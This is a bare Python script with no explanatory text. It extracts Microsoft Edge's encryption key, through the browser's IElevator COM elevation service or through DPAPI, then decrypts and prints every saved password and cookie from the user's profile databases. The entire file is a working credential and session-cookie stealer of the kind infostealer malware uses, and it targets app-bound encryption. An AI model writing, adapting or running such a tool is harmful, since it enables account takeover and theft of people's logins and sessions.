#!/usr/bin/env python3
import json, base64, os, sqlite3, shutil, tempfile, ctypes
from ctypes import wintypes, c_uint32, c_void_p, POINTER, byref
from Crypto.Cipher import AES
import comtypes
from comtypes import GUID

CLSID = GUID("{1FCBE96C-1697-43AF-9140-2897C7C69767}")
IID = GUID("{C9C2B807-7731-4F34-81B7-44FF7779522B}")
ole32 = ctypes.oledll.ole32

class BLOB(ctypes.Structure):
    _fields_ = [("cbData", c_uint32), ("pbData", c_void_p)]

def com_init():
    ole32.CoInitialize(None)

def com_create():
    p = c_void_p()
    hr = ole32.CoCreateInstance(byref(CLSID), None, 4, byref(IID), byref(p))
    if hr != 0: raise OSError(f"CoCreateInstance: 0x{hr & 0xFFFFFFFF:08X}")
    return p

def com_decrypt(obj, data):
    vtbl = ctypes.cast(obj, ctypes.POINTER(ctypes.c_void_p)).contents
    vtbl = ctypes.cast(vtbl, ctypes.POINTER(ctypes.c_void_p))
    fn_addr = vtbl[5]
    proto = ctypes.WINFUNCTYPE(ctypes.HRESULT, LPVOID, POINTER(BLOB), POINTER(BLOB), POINTER(wintypes.DWORD))
    func = proto(fn_addr)
    buf = ctypes.create_string_buffer(data)
    in_b = BLOB(cbData=len(data), pbData=ctypes.cast(buf, c_void_p))
    out_b = BLOB(cbData=0, pbData=None)
    err = wintypes.DWORD()
    hr = func(obj, byref(in_b), byref(out_b), byref(err))
    if hr != 0: raise OSError(f"DecryptData: 0x{hr & 0xFFFFFFFF:08X} err={err.value}")
    if out_b.cbData == 0: raise ValueError("empty")
    return ctypes.string_at(out_b.pbData, out_b.cbData)

def dpapi_unprotect(data):
    class DB(ctypes.Structure):
        _fields_ = [("cbData", c_uint32), ("pbData", ctypes.c_char_p)]
    crypt32 = ctypes.windll.crypt32
    inp = DB(cbData=len(data), pbData=ctypes.cast(ctypes.create_string_buffer(data), ctypes.c_char_p))
    out = DB(cbData=0, pbData=None)
    ret = crypt32.CryptUnprotectData(byref(inp), None, None, None, None, 0, byref(out))
    if not ret: raise OSError(f"DPAPI: {ctypes.GetLastError()}")
    result = ctypes.string_at(out.pbData, out.cbData)
    ctypes.windll.kernel32.LocalFree(out.pbData)
    return result

def decrypt_pw(blob, key):
    if not blob or len(blob) < 3: return None
    ver = blob[:3]
    if ver in (b'v10', b'v11'):
        return AES.new(key, AES.MODE_GCM, nonce=blob[3:15]).decrypt_and_verify(blob[15:-16], blob[-16:]).decode('utf-8', errors='replace')
    elif ver == b'v20':
        p = blob[3:]
        return AES.new(key, AES.MODE_GCM, nonce=p[:12]).decrypt_and_verify(p[12:-16], p[-16:]).decode('utf-8', errors='replace')
    return None

def main():
    com_init()
    profile = os.environ.get('USERPROFILE', 'C:\\Users\\admin')
    edge = os.path.join(profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
    with open(os.path.join(edge, 'Local State'), 'r', encoding='utf-8') as f:
        ls = json.load(f)
    osc = ls.get('os_crypt', {})
    aes_key = None; source = "none"
    
    ab_b64 = osc.get('app_bound_encrypted_key', '')
    if ab_b64:
        ab = base64.b64decode(ab_b64)
        blob = ab[4:]
        print(f"[*] COM DecryptData ({len(blob)} bytes)...")
        try:
            obj = com_create()
            print(f"[+] COM ptr: {obj}")
            aes_key = com_decrypt(obj, blob)
            source = "IElevator COM"
            print(f"[+] AES: {aes_key.hex()}")
        except Exception as e:
            print(f"[-] COM: {e}")
    
    if not aes_key:
        ek = osc.get('encrypted_key', '')
        if ek:
            eb = base64.b64decode(ek)
            aes_key = dpapi_unprotect(eb[5:])
            source = "v10 DPAPI"
            print(f"[+] v10: {aes_key.hex()}")
    
    if not aes_key: print("[-] no key"); return
    
    login_db = os.path.join(edge, 'Default', 'Login Data')
    tmp = os.path.join(tempfile.gettempdir(), f"ld_{os.getpid()}")
    shutil.copy2(login_db, tmp)
    conn = sqlite3.connect(tmp); c = conn.cursor()
    c.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC")
    print(f"\n{'='*80}\nPASSWORDS ({source})")
    for url, user, pw_blob in c.fetchall():
        pw = None
        if pw_blob:
            try: pw = decrypt_pw(pw_blob, aes_key)
            except Exception as e: pw = f"<err>"
        print(f"{(url or '?'):<50} {(user or '?'):<30} {pw}")
    
    ck = os.path.join(edge, 'Default', 'Network', 'Cookies')
    if os.path.exists(ck):
        shutil.copy2(ck, tmp)
        c2 = sqlite3.connect(tmp).cursor()
        c2.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value)>3")
        print(f"\nCOOKIES:")
        for h, n, e in c2.fetchall():
            try:
                v = decrypt_pw(e, aes_key)
                if v: print(f"  {h:40s} {n:25s} = {v[:50]}")
            except: pass
    conn.close(); os.remove(tmp)
    print("\n[+] done")

if __name__ == '__main__': main()